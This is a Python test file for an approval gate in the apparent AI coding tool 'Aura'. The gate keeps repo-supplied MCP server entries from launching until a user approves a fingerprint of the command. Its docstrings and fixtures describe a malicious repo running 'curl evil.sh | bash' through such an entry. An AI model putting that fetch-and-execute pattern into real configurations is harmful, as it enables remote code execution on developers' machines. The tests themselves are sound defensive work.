"""Tests for F-06-001 — project-layer MCP server approval gate.

A checked-in ``mcp_servers.json`` is an RCE channel: a malicious repo
can ship a project-layer entry whose ``command`` runs ``curl ... | bash``
and Aura would happily spawn it on first ``aura`` invocation. These
tests pin the approval contract that closes that gap, mirroring
claude-code's ``enabledMcpjsonServers`` pattern:

- Project-layer servers default to ``unapproved`` and are NOT loaded.
- ``/mcp approve <name>`` writes a fingerprint (sha256 of command +
  args + env keys) to user-scope ``~/.aura/mcp-approvals.json``.
- A subsequent session with a matching fingerprint loads silently.
- A diff to the command line invalidates the approval — re-prompt.
- User-scope (``~/.aura/mcp_servers.json``) entries skip the gate.
- ``/mcp revoke`` undoes an approval and disconnects.
- ``/mcp reload`` picks up new on-disk entries without an Agent restart.
- Concurrent writers don't corrupt the approvals file (atomic rename).
- Unapproved entries log a journal breadcrumb at construction time.
- ``/mcp list`` surfaces the un-approved set with a CTA so the operator
  sees actionable guidance the first time they look.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, cast
from unittest.mock import AsyncMock, MagicMock

import pytest
from langchain_core.tools import StructuredTool
from pydantic import BaseModel

from aura.config import mcp_approvals, mcp_store
from aura.config.schema import MCPServerConfig
from aura.core import journal
from aura.core.commands.mcp_cmd import MCPCommand
from aura.core.mcp.manager import MCPManager


class _P(BaseModel):
    q: str = ""


def _fake_tool(name: str) -> StructuredTool:
    async def _coro(q: str = "") -> dict[str, Any]:
        return {}

    return StructuredTool(
        name=name,
        description="fake",
        args_schema=_P,
        coroutine=_coro,
    )


@pytest.fixture
def isolated_home(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> Path:
    """Redirect ``Path.home()`` + cwd into ``tmp_path``.

    Mirrors the ``test_mcp_store`` fixture: an isolated faked home so
    real ``~/.aura/`` files (the developer's machine) can't pollute or
    be polluted by these tests. The project lives under
    ``tmp_path/project`` so ``mcp_store`` walks up from cwd into the
    fake home and stops cleanly at the boundary.
    """
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    monkeypatch.chdir(project_dir)
    return tmp_path


def _stub_client(monkeypatch: pytest.MonkeyPatch) -> MagicMock:
    """Install a fake :class:`MultiServerMCPClient` for the manager.

    Returns the fake client so tests can assert on its method calls.
    Tool/prompt/resource discovery returns empty lists by default; tests
    needing tools should patch ``fake_client.get_tools`` directly.
    """
    from aura.core.mcp import manager as manager_mod

    fake_client = MagicMock()
    fake_client.connections = {}
    fake_client.get_tools = AsyncMock(return_value=[])

    async def _empty_prompts(client: Any, server_name: str) -> list[Any]:
        return []

    async def _empty_resources(client: Any, server_name: str) -> list[Any]:
        return []

    def _make_client(connections: dict[str, Any]) -> MagicMock:
        fake_client.connections = dict(connections)
        return fake_client

    monkeypatch.setattr(manager_mod, "MultiServerMCPClient", _make_client)
    monkeypatch.setattr(
        MCPManager, "_list_prompts", staticmethod(_empty_prompts),
    )
    monkeypatch.setattr(
        MCPManager, "_list_resources", staticmethod(_empty_resources),
    )
    return fake_client


# ---------------------------------------------------------------------------
# Core gate: project-layer entries default to unapproved
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unapproved_server_not_loaded_at_startup(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A project-layer server with no approval must not be spawned.

    ``start_all`` should journal an ``mcp_server_unapproved`` event,
    skip the connect call entirely, and report state ``unapproved``
    via :meth:`status` so ``/mcp list`` can surface it.
    """
    fake_client = _stub_client(monkeypatch)
    log_path = isolated_home / "journal.jsonl"
    journal.configure(log_path)

    cfg = MCPServerConfig(name="malicious", command="curl", args=["evil.sh"])
    mgr = MCPManager([cfg], project_server_names={"malicious"})

    tools, commands = await mgr.start_all()
    assert tools == []
    assert commands == []
    fake_client.get_tools.assert_not_awaited()

    statuses = mgr.status()
    assert len(statuses) == 1
    assert statuses[0].state == "unapproved"

    # Journal records the held-back attempt at construction time.
    contents = log_path.read_text(encoding="utf-8")
    assert "mcp_server_unapproved" in contents
    assert "malicious" in contents
    journal.reset()


@pytest.mark.asyncio
async def test_approved_server_loads_when_fingerprint_matches(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A pre-approved project server with matching fingerprint loads silently.

    Persists an approval *before* manager construction and verifies the
    server skips the unapproved set, reaches state ``connected`` after
    ``start_all``, and surfaces its tool through the manager's return.
    """
    fake_client = _stub_client(monkeypatch)
    fake_client.get_tools = AsyncMock(return_value=[_fake_tool("search")])

    cfg = MCPServerConfig(name="known", command="npx", args=["-y", "pkg"])
    # Pre-approve before constructing the manager — mirrors the
    # second-and-subsequent-run path.
    mcp_approvals.approve(cfg)

    mgr = MCPManager([cfg], project_server_names={"known"})
    assert mgr.unapproved_server_names() == set()

    tools, _ = await mgr.start_all()
    assert [t.name for t in tools] == ["mcp__known__search"]
    assert mgr.status()[0].state == "connected"


@pytest.mark.asyncio
async def test_approval_invalidated_when_command_changes(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Approving config-A then loading config-B (different command) re-prompts.

    The fingerprint covers ``command + args + env keys`` so a malicious
    diff to the command line — the actual RCE escalation vector —
    forces re-approval rather than silently honouring the stale signal.
    """
    _stub_client(monkeypatch)
    cfg_old = MCPServerConfig(name="srv", command="npx", args=["-y", "good"])
    mcp_approvals.approve(cfg_old)

    cfg_new = MCPServerConfig(
        name="srv", command="curl", args=["evil.sh"],
    )
    mgr = MCPManager([cfg_new], project_server_names={"srv"})
    assert "srv" in mgr.unapproved_server_names()
    assert mgr.status()[0].state == "unapproved"


@pytest.mark.asyncio
async def test_user_scope_servers_skip_approval_check(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A user-scope (non-project-layer) server loads without approval.

    The user authored their own ``aura mcp add`` entry; gating it would
    be theatre. Only project-layer entries (those discovered via the
    walk-up from cwd) participate in the approval gate.
    """
    fake_client = _stub_client(monkeypatch)
    fake_client.get_tools = AsyncMock(return_value=[_fake_tool("t")])

    cfg = MCPServerConfig(name="user_srv", command="npx", args=[])
    # NOTE: project_server_names is empty — explicitly user-scope.
    mgr = MCPManager([cfg], project_server_names=set())
    assert mgr.unapproved_server_names() == set()

    tools, _ = await mgr.start_all()
    assert [t.name for t in tools] == ["mcp__user_srv__t"]


# ---------------------------------------------------------------------------
# /mcp approve / revoke
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_approve_persists_to_user_state(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``manager.approve`` writes the approval to the user-scope JSON file.

    Asserts both the side effect (file exists with the right shape)
    and the in-memory state (``unapproved`` set shrinks, status flips).
    """
    fake_client = _stub_client(monkeypatch)
    fake_client.get_tools = AsyncMock(return_value=[_fake_tool("ok")])

    cfg = MCPServerConfig(name="proj_srv", command="npx", args=["-y", "pkg"])
    mgr = MCPManager([cfg], project_server_names={"proj_srv"})
    assert "proj_srv" in mgr.unapproved_server_names()

    text = await mgr.approve("proj_srv")
    assert "approved" in text.lower()

    # File exists and contains a fingerprint + iso8601 timestamp for
    # the (project, server) tuple.
    raw = json.loads(mcp_approvals.approvals_path().read_text(encoding="utf-8"))
    assert raw["version"] == 1
    project_key = mcp_approvals.project_key()
    assert "proj_srv" in raw["approvals"][project_key]
    entry = raw["approvals"][project_key]["proj_srv"]
    assert entry["fingerprint"] == mcp_approvals.fingerprint(cfg)
    assert entry["approved_at"].startswith(("19", "20"))  # iso8601 yyyy-mm-...

    # In-memory state cleared.
    assert mgr.unapproved_server_names() == set()
    assert mgr.status()[0].state == "connected"


@pytest.mark.asyncio
async def test_revoke_disconnects_and_removes_approval(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``manager.revoke`` removes the approval AND tears the live connection down.

    The user-visible promise of revoke is "this server is no longer
    trusted starting now". Leaving a live subprocess from the previous
    approval would violate that promise.
    """
    fake_client = _stub_client(monkeypatch)
    fake_client.get_tools = AsyncMock(return_value=[_fake_tool("ok")])

    cfg = MCPServerConfig(name="proj_srv", command="npx", args=[])
    mcp_approvals.approve(cfg)

    mgr = MCPManager([cfg], project_server_names={"proj_srv"})
    await mgr.start_all()
    assert mgr.status()[0].state == "connected"

    text = await mgr.revoke("proj_srv")
    assert "revoked" in text.lower() or "disconnected" in text.lower()

    # Approval removed from the user-scope file.
    raw = mcp_approvals._load_raw()
    project_key = mcp_approvals.project_key()
    assert "proj_srv" not in raw.get("approvals", {}).get(project_key, {})

    # State is back to ``unapproved``; live connection tore down.
    assert mgr.status()[0].state == "unapproved"
    assert "proj_srv" not in fake_client.connections


# ---------------------------------------------------------------------------
# Atomic writes
# ---------------------------------------------------------------------------


def test_concurrent_approval_writes_are_atomic(
    isolated_home: Path,
) -> None:
    """Many sequential writes to the approvals file produce a valid JSON tree.

    We simulate a worst-case sequence by approving N distinct configs
    back-to-back. Even on the slowest filesystem, the file MUST always
    parse as JSON afterward — ``os.replace`` guarantees we never see a
    half-written intermediate. A leftover ``.tmp`` file would also be
    a smell (would mean the temp-file cleanup path leaks).
    """
    configs = [
        MCPServerConfig(name=f"srv{i}", command="npx", args=[f"a{i}"])
        for i in range(10)
    ]
    for cfg in configs:
        mcp_approvals.approve(cfg)

    raw = json.loads(mcp_approvals.approvals_path().read_text(encoding="utf-8"))
    project_key = mcp_approvals.project_key()
    assert set(raw["approvals"][project_key].keys()) == {
        f"srv{i}" for i in range(10)
    }
    # No leftover temp files in the parent directory.
    leftovers = [
        p.name for p in mcp_approvals.approvals_path().parent.iterdir()
        if p.name.startswith(".mcp-approvals.") and p.suffix == ".tmp"
    ]
    assert leftovers == []


# ---------------------------------------------------------------------------
# Journal breadcrumb
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_journal_records_unapproved_attempt(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Every unapproved project-server load attempt writes ONE journal line.

    Used by ``/stats`` and ad-hoc forensics: an operator should be able
    to grep the session journal for ``mcp_server_unapproved`` and find
    each held-back server with its name + project key.
    """
    _stub_client(monkeypatch)
    log_path = isolated_home / "journal.jsonl"
    journal.configure(log_path)

    cfg = MCPServerConfig(name="srv1", command="npx", args=[])
    MCPManager([cfg], project_server_names={"srv1"})

    lines = log_path.read_text(encoding="utf-8").strip().splitlines()
    matching = [ln for ln in lines if "mcp_server_unapproved" in ln]
    assert len(matching) == 1
    payload = json.loads(matching[0])
    assert payload["server"] == "srv1"
    assert "project" in payload
    journal.reset()


# ---------------------------------------------------------------------------
# Reload — F-06-014 free win bundled with the approval work
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_mcp_reload_picks_up_new_servers(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Adding a server post-construction lands in the manager via ``reload``.

    The new entry should appear in ``status()`` and (because we passed
    no ``project_server_names`` for the new entry) immediately be
    ``never_started`` — eligible for ``/mcp enable``.
    """
    _stub_client(monkeypatch)
    cfg_a = MCPServerConfig(name="a", command="npx", args=[])
    mgr = MCPManager([cfg_a], project_server_names=set())
    assert {s.name for s in mgr.status()} == {"a"}

    cfg_b = MCPServerConfig(name="b", command="npx", args=[])
    summary = await mgr.reload([cfg_a, cfg_b], project_server_names=set())
    assert "+1" in summary  # one server added
    assert {s.name for s in mgr.status()} == {"a", "b"}
    assert mgr.status()[1].state == "never_started"


@pytest.mark.asyncio
async def test_mcp_reload_drops_removed_servers(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Reloading without a previously-known server removes it from status().

    Companion to the ``picks_up_new`` case — verifies the symmetric
    "delete" path and that we don't leak stale state for a removed
    server (would otherwise confuse a subsequent ``approve`` /
    ``enable``).
    """
    fake_client = _stub_client(monkeypatch)
    fake_client.get_tools = AsyncMock(return_value=[])

    cfg_a = MCPServerConfig(name="a", command="npx", args=[])
    cfg_b = MCPServerConfig(name="b", command="npx", args=[])
    mgr = MCPManager([cfg_a, cfg_b], project_server_names=set())
    await mgr.start_all()

    summary = await mgr.reload([cfg_a], project_server_names=set())
    assert "-1" in summary
    assert {s.name for s in mgr.status()} == {"a"}


# ---------------------------------------------------------------------------
# /mcp list visibility
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unapproved_server_visible_via_mcp_list(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The ``/mcp`` slash command surfaces unapproved servers + a CTA.

    The CTA gives the operator a path forward without requiring them
    to read docs. We assert on substring presence rather than exact
    text so cosmetic tweaks to the wording don't cascade-fail.
    """
    _stub_client(monkeypatch)

    cfg = MCPServerConfig(name="proj_srv", command="curl", args=["evil"])
    mgr = MCPManager([cfg], project_server_names={"proj_srv"})

    # Build a minimal duck-type for the slash command's ``Agent`` arg —
    # MCPCommand only reads ``_mcp_manager``.
    class _FakeAgent:
        _mcp_manager: Any

    fake_agent = _FakeAgent()
    fake_agent._mcp_manager = mgr

    cmd = MCPCommand()
    result = await cmd.handle("", cast(Any, fake_agent))
    assert result.handled
    text = result.text or ""
    assert "proj_srv" in text
    assert "approve" in text.lower()
    assert "unapproved" in text.lower()


# ---------------------------------------------------------------------------
# Bonus — fingerprint correctness (the security-critical primitive)
# ---------------------------------------------------------------------------


def test_fingerprint_changes_on_command_diff() -> None:
    """A command-line diff must produce a different fingerprint.

    This is the property the audit attack scenario depends on: a
    repo cannot swap ``npx good-pkg`` for ``curl evil.sh | bash``
    while keeping the same stored approval.
    """
    a = MCPServerConfig(name="x", command="npx", args=["good"])
    b = MCPServerConfig(name="x", command="curl", args=["evil.sh"])
    assert mcp_approvals.fingerprint(a) != mcp_approvals.fingerprint(b)


def test_fingerprint_stable_across_env_value_rotation() -> None:
    """Rotating an env *value* must NOT invalidate the approval.

    Rationale: secrets are rotated routinely; forcing re-approval on
    a token rotation would be the opposite of useful. Adding a NEW
    env *key* still re-prompts — that's a meaningful change.
    """
    a = MCPServerConfig(
        name="x", command="npx", args=[], env={"TOKEN": "old-secret"},
    )
    b = MCPServerConfig(
        name="x", command="npx", args=[], env={"TOKEN": "new-secret"},
    )
    assert mcp_approvals.fingerprint(a) == mcp_approvals.fingerprint(b)

    c = MCPServerConfig(
        name="x", command="npx", args=[],
        env={"TOKEN": "old-secret", "EXTRA_KEY": "x"},
    )
    assert mcp_approvals.fingerprint(a) != mcp_approvals.fingerprint(c)


def test_approve_then_load_for_project_round_trip(isolated_home: Path) -> None:
    """``approve`` → ``load_for_project`` round-trip preserves the fingerprint.

    Sanity test for the disk schema. If a future refactor changes the
    on-disk shape (e.g. nesting under a new top-level key) this test
    keeps the parse path honest.
    """
    cfg = MCPServerConfig(name="x", command="npx", args=["a"])
    mcp_approvals.approve(cfg)
    bucket = mcp_approvals.load_for_project()
    assert "x" in bucket
    assert bucket["x"].fingerprint == mcp_approvals.fingerprint(cfg)


def test_revoke_idempotent_returns_false_on_missing(
    isolated_home: Path,
) -> None:
    """Revoking a never-approved server returns False (no-op, no error).

    Idempotence is a stated contract; this pins it so a future
    refactor that throws on missing entry surfaces here.
    """
    assert mcp_approvals.revoke("ghost") is False


@pytest.mark.asyncio
async def test_approve_unknown_server_returns_clean_error(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``/mcp approve <not-in-config>`` reports a textual error, not a stack.

    The slash command never raises on unknown name — it returns a
    user-readable string. Keeps the REPL responsive even when the
    operator tab-completes wrong.
    """
    _stub_client(monkeypatch)
    cfg = MCPServerConfig(name="known", command="npx", args=[])
    mgr = MCPManager([cfg], project_server_names={"known"})
    text = await mgr.approve("does_not_exist")
    assert "no MCP server named" in text


@pytest.mark.asyncio
async def test_user_scope_approve_is_noop(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Approving a user-scope server returns a friendly no-op.

    Mirrors the rationale in ``test_user_scope_servers_skip_approval``:
    the user already authored the entry, so "approving" it has no
    semantic meaning. We surface that explicitly rather than silently
    writing a stale fingerprint to disk.
    """
    _stub_client(monkeypatch)
    cfg = MCPServerConfig(name="user_srv", command="npx", args=[])
    mgr = MCPManager([cfg], project_server_names=set())
    text = await mgr.approve("user_srv")
    assert "user-scope" in text


# ---------------------------------------------------------------------------
# Auto-detection from mcp_store (Agent-side default path)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_auto_detect_project_names_from_store(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Manager built without ``project_server_names`` consults the store.

    This is the path the Agent's ``aconnect`` exercises: it passes the
    flat config list and trusts the manager to figure out which names
    are project-layer. Verify the auto-detect picks up an entry in
    ``<cwd>/.aura/mcp_servers.json`` and gates it.
    """
    _stub_client(monkeypatch)
    # Write a project-layer entry directly via the store's save path.
    cfg = MCPServerConfig(name="proj_srv", command="curl", args=["evil"])
    mcp_store.save([cfg], scope="project")

    # Sanity: the store agrees this is a project-layer name.
    assert "proj_srv" in mcp_store.project_layer_names()

    # Build manager with NO ``project_server_names`` kwarg → auto-detect.
    mgr = MCPManager([cfg])
    assert "proj_srv" in mgr.unapproved_server_names()
    assert mgr.status()[0].state == "unapproved"


@pytest.mark.asyncio
async def test_reload_via_slash_command_picks_up_disk_changes(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``/mcp reload`` triggers a re-read of ``mcp_store`` and updates state.

    End-to-end check that the slash command path wires through to the
    manager's reload (not just a direct call). Adds an entry to disk
    after manager construction and verifies it shows up post-reload.
    """
    _stub_client(monkeypatch)

    cfg_a = MCPServerConfig(name="a", command="npx", args=[])
    mcp_store.save([cfg_a], scope="global")
    mgr = MCPManager([cfg_a])

    # Add a new entry to disk that the manager hasn't seen.
    cfg_b = MCPServerConfig(name="b", command="npx", args=[])
    mcp_store.save([cfg_a, cfg_b], scope="global")

    class _FakeAgent:
        _mcp_manager: Any

    fake_agent = _FakeAgent()
    fake_agent._mcp_manager = mgr

    cmd = MCPCommand()
    result = await cmd.handle("reload", cast(Any, fake_agent))
    assert result.handled
    assert "+1" in (result.text or "")
    assert {s.name for s in mgr.status()} == {"a", "b"}


# ---------------------------------------------------------------------------
# project_key resolves symlinks
# ---------------------------------------------------------------------------


def test_project_key_resolves_symlinks(
    isolated_home: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A symlinked cwd resolves to the same project key as the canonical path.

    Without this, an operator who reaches their project via a symlink
    would re-prompt every time they switch invocation paths — useless
    UX and a footgun for mounting setups (Docker bind mounts, etc.).
    """
    real = isolated_home / "real_project"
    real.mkdir()
    link = isolated_home / "via_link"
    link.symlink_to(real)

    a = mcp_approvals.project_key(real)
    b = mcp_approvals.project_key(link)
    assert a == b
